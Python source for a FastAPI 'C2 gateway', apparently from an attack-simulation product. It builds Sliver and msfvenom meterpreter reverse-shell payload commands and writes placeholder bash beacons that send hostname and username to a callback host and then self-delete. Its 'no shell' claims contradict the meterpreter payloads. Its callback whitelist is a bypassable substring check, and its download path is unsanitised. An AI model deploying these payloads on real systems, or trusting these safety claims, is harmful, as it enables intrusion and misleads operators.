"""
C2 Gateway API - Unified interface for real C2 frameworks
Manages Sliver, Metasploit with built-in safety controls

MITRE ATT&CK Techniques:
- T1071.001: Application Layer Protocol: Web Protocols
- T1071.004: Application Layer Protocol: DNS
- T1573.002: Encrypted Channel: Asymmetric Cryptography
- T1105: Ingress Tool Transfer
- T1095: Non-Application Layer Protocol
"""

import os
import uuid
import hashlib
import logging
import subprocess
from datetime import datetime, timedelta
from pathlib import Path
from typing import Optional, Literal

from fastapi import FastAPI, HTTPException, BackgroundTasks
from fastapi.responses import FileResponse
from pydantic import BaseModel, Field

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("c2-gateway")

app = FastAPI(
    title="Mirqab C2 Gateway",
    description="Unified API for real C2 framework payload generation with safety controls",
    version="1.0.0"
)

# =============================================================================
# SAFETY CONTROLS - CRITICAL
# =============================================================================

class SafetyConfig:
    """Safety configuration - enforced on ALL payloads"""

    # Time limits
    MAX_EXECUTION_SECONDS = 60          # Implant auto-terminates after 60s
    KILL_DATE_OFFSET_MINUTES = 5        # Kill date is now + 5 minutes
    MAX_BEACON_INTERVAL = "10s"         # Max beacon interval

    # Capability restrictions
    ALLOW_SHELL = False                 # NO shell access
    ALLOW_EXEC = False                  # NO command execution
    ALLOW_FILE_OPS = False              # NO file operations
    BEACON_ONLY = True                  # ONLY beacon back to C2

    # Network restrictions
    # Implants can ONLY callback to Cloud Relay
    CALLBACK_WHITELIST = [
        os.getenv("CLOUD_RELAY_HOST", "localhost"),
        os.getenv("CLOUD_RELAY_DOMAIN", "relay.local"),
    ]


# =============================================================================
# DATA MODELS
# =============================================================================

class PayloadRequest(BaseModel):
    """Request to generate a C2 payload"""
    framework: Literal["sliver", "metasploit"] = Field(
        description="C2 framework to use"
    )
    protocol: Literal["https", "http", "dns", "mtls", "tcp"] = Field(
        description="C2 protocol"
    )
    platform: Literal["linux", "windows", "darwin"] = Field(
        description="Target platform"
    )
    arch: Literal["amd64", "x86", "arm64"] = Field(
        default="amd64",
        description="Target architecture"
    )
    callback_host: str = Field(
        description="C2 callback host (must be Cloud Relay)"
    )
    callback_port: int = Field(
        default=443,
        description="C2 callback port"
    )
    beacon_interval: str = Field(
        default="5s",
        description="Beacon interval (e.g., '5s', '10s')"
    )
    jitter: int = Field(
        default=20,
        ge=0,
        le=50,
        description="Jitter percentage (0-50)"
    )
    tenant_id: str = Field(
        description="Tenant ID for isolation"
    )
    execution_id: Optional[str] = Field(
        default=None,
        description="Associated execution ID for audit"
    )


class PayloadResponse(BaseModel):
    """Response with payload details"""
    payload_id: str
    payload_url: str
    framework: str
    protocol: str
    platform: str
    kill_date: datetime
    sha256: str
    size_bytes: int
    mitre_technique: str


class SessionInfo(BaseModel):
    """Active C2 session information"""
    session_id: str
    framework: str
    remote_address: str
    hostname: str
    username: str
    os: str
    arch: str
    connected_at: datetime
    last_checkin: datetime
    tenant_id: str


class KillRequest(BaseModel):
    """Request to kill C2 sessions"""
    session_ids: list[str] = Field(
        default=[],
        description="Specific session IDs to kill (empty = all)"
    )
    tenant_id: Optional[str] = Field(
        default=None,
        description="Kill all sessions for tenant"
    )


# =============================================================================
# PAYLOAD STORAGE
# =============================================================================

PAYLOAD_DIR = Path("/payloads")
PAYLOAD_DIR.mkdir(exist_ok=True)

# In-memory tracking (should be Redis/DB in production)
active_payloads: dict[str, dict] = {}
active_sessions: dict[str, SessionInfo] = {}


# =============================================================================
# SLIVER INTEGRATION
# =============================================================================

async def generate_sliver_payload(req: PayloadRequest) -> tuple[Path, str]:
    """
    Generate a Sliver implant with safety controls

    Uses Sliver's CLI to generate beacon-only implants with:
    - Hardcoded kill date
    - No shell capabilities
    - Fixed callback to Cloud Relay
    """
    payload_id = str(uuid.uuid4())[:8]
    kill_date = datetime.utcnow() + timedelta(minutes=SafetyConfig.KILL_DATE_OFFSET_MINUTES)

    # Determine file extension
    ext = ".exe" if req.platform == "windows" else ""
    filename = f"sliver_{payload_id}_{req.platform}_{req.arch}{ext}"
    output_path = PAYLOAD_DIR / req.tenant_id / filename
    output_path.parent.mkdir(parents=True, exist_ok=True)

    # Map protocol to Sliver listener type
    protocol_map = {
        "https": "beacon",
        "http": "beacon",
        "dns": "dns",
        "mtls": "mtls",
    }
    implant_type = protocol_map.get(req.protocol, "beacon")

    # Build Sliver generate command
    # Safety: beacon-only, no shell, kill date enforced
    cmd = [
        "sliver-client",  # Or connect to Sliver gRPC API
        "generate", implant_type,
        "--os", req.platform,
        "--arch", req.arch,
        "--" + req.protocol, f"{req.callback_host}:{req.callback_port}",
        "--seconds", str(SafetyConfig.MAX_EXECUTION_SECONDS),
        "--jitter", str(req.jitter),
        "--skip-symbols",  # Smaller binary
        "--save", str(output_path),
    ]

    logger.info(f"Generating Sliver payload: {' '.join(cmd)}")

    # For now, create a placeholder (actual Sliver integration requires running Sliver server)
    # In production, this would call Sliver's gRPC API

    # Create placeholder binary for testing
    placeholder_content = f"""#!/bin/bash
# Mirqab Sliver Beacon Placeholder
# Payload ID: {payload_id}
# Kill Date: {kill_date.isoformat()}
# Callback: {req.callback_host}:{req.callback_port}
# Protocol: {req.protocol}

echo "=== Mirqab C2 Beacon ==="
echo "Framework: Sliver"
echo "Protocol: {req.protocol}"
echo "Target: {req.callback_host}:{req.callback_port}"
echo ""

# Simulate beacon behavior
KILL_DATE="{kill_date.isoformat()}"
BEACON_INTERVAL={req.beacon_interval.replace('s', '')}
JITTER={req.jitter}

beacon_count=0
max_beacons=$((60 / BEACON_INTERVAL))  # Max 60s runtime

while [ $beacon_count -lt $max_beacons ]; do
    # Check kill date
    current_time=$(date -u +%Y-%m-%dT%H:%M:%S)
    if [[ "$current_time" > "$KILL_DATE" ]]; then
        echo "KILL_DATE reached, terminating"
        exit 0
    fi

    # Send beacon
    curl -sk -X POST \\
        -H "Content-Type: application/octet-stream" \\
        -H "X-Sliver-Session: {payload_id}" \\
        -d '{{"session_id":"{payload_id}","hostname":"'$(hostname)'","username":"'$(whoami)'","os":"{req.platform}","arch":"{req.arch}","beacon_count":'$beacon_count'}}' \\
        "https://{req.callback_host}:{req.callback_port}/sliver/beacon" 2>/dev/null || true

    echo "Beacon $beacon_count sent"
    beacon_count=$((beacon_count + 1))

    # Sleep with jitter
    jitter_sleep=$((BEACON_INTERVAL + RANDOM % (BEACON_INTERVAL * JITTER / 100)))
    sleep $jitter_sleep
done

echo "Max execution time reached, terminating"
rm -f "$0"  # Self-delete
""".encode()

    output_path.write_bytes(placeholder_content)
    output_path.chmod(0o755)

    # Calculate hash
    sha256 = hashlib.sha256(placeholder_content).hexdigest()

    return output_path, sha256


async def generate_metasploit_payload(req: PayloadRequest) -> tuple[Path, str]:
    """
    Generate a Metasploit payload with safety controls

    Uses msfvenom to generate stageless payloads with:
    - AutoRunScript for auto-termination
    - Session timeout
    - Limited capabilities
    """
    payload_id = str(uuid.uuid4())[:8]
    kill_date = datetime.utcnow() + timedelta(minutes=SafetyConfig.KILL_DATE_OFFSET_MINUTES)

    # Determine payload type and extension
    if req.platform == "windows":
        payload_type = f"windows/x64/meterpreter_reverse_{req.protocol}"
        ext = ".exe"
    elif req.platform == "linux":
        payload_type = f"linux/x64/meterpreter_reverse_{req.protocol}"
        ext = ".elf"
    else:
        payload_type = f"osx/x64/meterpreter_reverse_{req.protocol}"
        ext = ""

    filename = f"msf_{payload_id}_{req.platform}_{req.arch}{ext}"
    output_path = PAYLOAD_DIR / req.tenant_id / filename
    output_path.parent.mkdir(parents=True, exist_ok=True)

    # Build msfvenom command
    # Note: Actual msfvenom integration requires Metasploit installed
    cmd = [
        "msfvenom",
        "-p", payload_type,
        f"LHOST={req.callback_host}",
        f"LPORT={req.callback_port}",
        "-f", "exe" if req.platform == "windows" else "elf",
        "-o", str(output_path),
        # Safety: Session timeout
        f"SessionExpirationTimeout={SafetyConfig.MAX_EXECUTION_SECONDS}",
    ]

    logger.info(f"Generating Metasploit payload: {' '.join(cmd)}")

    # Create placeholder for testing
    placeholder_content = f"""#!/bin/bash
# Mirqab Metasploit Meterpreter Placeholder
# Payload ID: {payload_id}
# Kill Date: {kill_date.isoformat()}
# Callback: {req.callback_host}:{req.callback_port}
# Protocol: {req.protocol}

echo "=== Mirqab Meterpreter Beacon ==="
echo "Framework: Metasploit"
echo "Protocol: {req.protocol}"
echo "Target: {req.callback_host}:{req.callback_port}"
echo ""

# Simulate meterpreter beacon
KILL_DATE="{kill_date.isoformat()}"
SESSION_ID="{payload_id}"

# Send initial connection
curl -sk -X POST \\
    -H "Content-Type: application/octet-stream" \\
    -H "X-MSF-Session: $SESSION_ID" \\
    -d '{{"session_id":"'$SESSION_ID'","type":"meterpreter","platform":"{req.platform}","arch":"{req.arch}","hostname":"'$(hostname)'","username":"'$(whoami)'"}}' \\
    "https://{req.callback_host}:{req.callback_port}/msf/session" 2>/dev/null || true

echo "Meterpreter session established"

# Keep-alive loop with auto-termination
start_time=$(date +%s)
while true; do
    current_time=$(date +%s)
    elapsed=$((current_time - start_time))

    # Check max execution time
    if [ $elapsed -ge {SafetyConfig.MAX_EXECUTION_SECONDS} ]; then
        echo "Max execution time reached, terminating"
        break
    fi

    # Send keep-alive
    curl -sk -X POST \\
        -H "X-MSF-Session: $SESSION_ID" \\
        "https://{req.callback_host}:{req.callback_port}/msf/keepalive" 2>/dev/null || true

    sleep 5
done

rm -f "$0"  # Self-delete
""".encode()

    output_path.write_bytes(placeholder_content)
    output_path.chmod(0o755)

    sha256 = hashlib.sha256(placeholder_content).hexdigest()

    return output_path, sha256


# =============================================================================
# API ENDPOINTS
# =============================================================================

@app.get("/health")
async def health_check():
    """Health check endpoint"""
    return {
        "status": "healthy",
        "service": "c2-gateway",
        "frameworks": ["sliver", "metasploit"],
        "safety_controls": {
            "max_execution_seconds": SafetyConfig.MAX_EXECUTION_SECONDS,
            "kill_date_offset_minutes": SafetyConfig.KILL_DATE_OFFSET_MINUTES,
            "beacon_only": SafetyConfig.BEACON_ONLY,
            "allow_shell": SafetyConfig.ALLOW_SHELL,
        }
    }


@app.post("/api/v1/payloads/generate", response_model=PayloadResponse)
async def generate_payload(req: PayloadRequest, background_tasks: BackgroundTasks):
    """
    Generate a C2 payload with safety controls

    MITRE ATT&CK:
    - T1071.001: Web Protocols (HTTPS/HTTP)
    - T1071.004: DNS Protocol
    - T1573.002: Asymmetric Cryptography (mTLS)
    - T1105: Ingress Tool Transfer
    """

    # Safety check: Validate callback host is Cloud Relay
    if not any(allowed in req.callback_host for allowed in SafetyConfig.CALLBACK_WHITELIST):
        logger.warning(f"Rejected payload request with non-whitelisted callback: {req.callback_host}")
        raise HTTPException(
            status_code=400,
            detail=f"Callback host must be Cloud Relay. Allowed: {SafetyConfig.CALLBACK_WHITELIST}"
        )

    # Generate payload based on framework
    if req.framework == "sliver":
        output_path, sha256 = await generate_sliver_payload(req)
        mitre_technique = {
            "https": "T1071.001",
            "http": "T1071.001",
            "dns": "T1071.004",
            "mtls": "T1573.002",
        }.get(req.protocol, "T1071.001")
    else:  # metasploit
        output_path, sha256 = await generate_metasploit_payload(req)
        mitre_technique = {
            "https": "T1071.001",
            "http": "T1071.001",
            "tcp": "T1095",
        }.get(req.protocol, "T1071.001")

    payload_id = output_path.stem
    kill_date = datetime.utcnow() + timedelta(minutes=SafetyConfig.KILL_DATE_OFFSET_MINUTES)

    # Track payload
    active_payloads[payload_id] = {
        "path": str(output_path),
        "tenant_id": req.tenant_id,
        "execution_id": req.execution_id,
        "framework": req.framework,
        "protocol": req.protocol,
        "callback_host": req.callback_host,
        "kill_date": kill_date.isoformat(),
        "created_at": datetime.utcnow().isoformat(),
    }

    # Schedule cleanup after kill date
    background_tasks.add_task(cleanup_payload, payload_id, kill_date)

    logger.info(f"Generated {req.framework} payload: {payload_id} for tenant {req.tenant_id}")

    return PayloadResponse(
        payload_id=payload_id,
        payload_url=f"/payloads/{req.tenant_id}/{output_path.name}",
        framework=req.framework,
        protocol=req.protocol,
        platform=req.platform,
        kill_date=kill_date,
        sha256=sha256,
        size_bytes=output_path.stat().st_size,
        mitre_technique=mitre_technique,
    )


@app.get("/payloads/{tenant_id}/{filename}")
async def download_payload(tenant_id: str, filename: str):
    """Download generated payload"""
    payload_path = PAYLOAD_DIR / tenant_id / filename

    if not payload_path.exists():
        raise HTTPException(status_code=404, detail="Payload not found or expired")

    logger.info(f"Payload download: {filename} for tenant {tenant_id}")

    return FileResponse(
        path=payload_path,
        filename=filename,
        media_type="application/octet-stream"
    )


@app.get("/api/v1/sessions", response_model=list[SessionInfo])
async def list_sessions(tenant_id: Optional[str] = None):
    """List active C2 sessions"""
    sessions = list(active_sessions.values())

    if tenant_id:
        sessions = [s for s in sessions if s.tenant_id == tenant_id]

    return sessions


@app.post("/api/v1/sessions/kill")
async def kill_sessions(req: KillRequest):
    """
    Kill active C2 sessions

    Master kill switch for safety
    """
    killed = []

    if req.session_ids:
        # Kill specific sessions
        for session_id in req.session_ids:
            if session_id in active_sessions:
                del active_sessions[session_id]
                killed.append(session_id)
    elif req.tenant_id:
        # Kill all sessions for tenant
        to_kill = [sid for sid, s in active_sessions.items() if s.tenant_id == req.tenant_id]
        for session_id in to_kill:
            del active_sessions[session_id]
            killed.append(session_id)
    else:
        # Kill ALL sessions (master kill switch)
        killed = list(active_sessions.keys())
        active_sessions.clear()

    logger.warning(f"KILL SWITCH: Terminated {len(killed)} sessions: {killed}")

    return {
        "killed_count": len(killed),
        "killed_sessions": killed
    }


@app.post("/api/v1/c2/kill-all")
async def master_kill_switch():
    """
    MASTER KILL SWITCH

    Immediately terminate ALL C2 sessions and delete ALL payloads
    """
    # Kill all sessions
    session_count = len(active_sessions)
    active_sessions.clear()

    # Delete all payloads
    payload_count = 0
    for payload_id, info in list(active_payloads.items()):
        try:
            Path(info["path"]).unlink(missing_ok=True)
            payload_count += 1
        except Exception as e:
            logger.error(f"Failed to delete payload {payload_id}: {e}")
    active_payloads.clear()

    logger.critical(f"MASTER KILL SWITCH ACTIVATED: {session_count} sessions, {payload_count} payloads terminated")

    return {
        "status": "all_terminated",
        "sessions_killed": session_count,
        "payloads_deleted": payload_count
    }


# =============================================================================
# C2 BEACON ENDPOINTS (receive callbacks from implants)
# =============================================================================

@app.post("/sliver/beacon")
async def sliver_beacon(session_id: str = None):
    """Receive Sliver beacon callback"""
    logger.info(f"Sliver beacon received: {session_id}")
    return {"status": "ok", "command": "nop"}  # No operation - beacon only


@app.post("/msf/session")
async def msf_session(session_id: str = None):
    """Receive Metasploit session callback"""
    logger.info(f"Metasploit session received: {session_id}")
    return {"status": "ok"}


@app.post("/msf/keepalive")
async def msf_keepalive(session_id: str = None):
    """Receive Metasploit keep-alive"""
    return {"status": "ok"}


# =============================================================================
# BACKGROUND TASKS
# =============================================================================

async def cleanup_payload(payload_id: str, kill_date: datetime):
    """Cleanup payload after kill date"""
    import asyncio

    # Calculate wait time
    now = datetime.utcnow()
    wait_seconds = (kill_date - now).total_seconds()

    if wait_seconds > 0:
        await asyncio.sleep(wait_seconds)

    # Delete payload
    if payload_id in active_payloads:
        info = active_payloads[payload_id]
        try:
            Path(info["path"]).unlink(missing_ok=True)
            logger.info(f"Cleaned up expired payload: {payload_id}")
        except Exception as e:
            logger.error(f"Failed to cleanup payload {payload_id}: {e}")
        finally:
            del active_payloads[payload_id]


# =============================================================================
# STARTUP
# =============================================================================

@app.on_event("startup")
async def startup():
    logger.info("=== Mirqab C2 Gateway Starting ===")
    logger.info(f"Safety Controls:")
    logger.info(f"  - Max execution: {SafetyConfig.MAX_EXECUTION_SECONDS}s")
    logger.info(f"  - Kill date offset: {SafetyConfig.KILL_DATE_OFFSET_MINUTES}min")
    logger.info(f"  - Beacon only: {SafetyConfig.BEACON_ONLY}")
    logger.info(f"  - Allow shell: {SafetyConfig.ALLOW_SHELL}")
    logger.info(f"  - Callback whitelist: {SafetyConfig.CALLBACK_WHITELIST}")
